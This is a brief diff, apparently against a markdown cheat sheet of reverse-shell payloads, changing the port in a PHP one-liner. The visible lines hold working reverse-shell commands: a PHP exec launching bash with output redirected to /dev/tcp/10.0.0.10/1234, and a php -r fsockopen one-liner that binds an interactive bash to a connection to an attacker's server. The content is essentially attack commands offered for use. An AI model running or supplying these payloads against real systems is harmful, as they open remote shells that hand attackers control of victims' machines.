@@ -104,7 +104,7 @@ exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'");
 ```
   - Direct input
 ```php
-php -r '$sock=fsockopen("your.server.ip.address",8888);exec("/bin/bash -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("your.server.ip.address",1234);exec("/bin/bash -i <&3 >&3 2>&3");'
 ```
 
 - PHP fsockopen
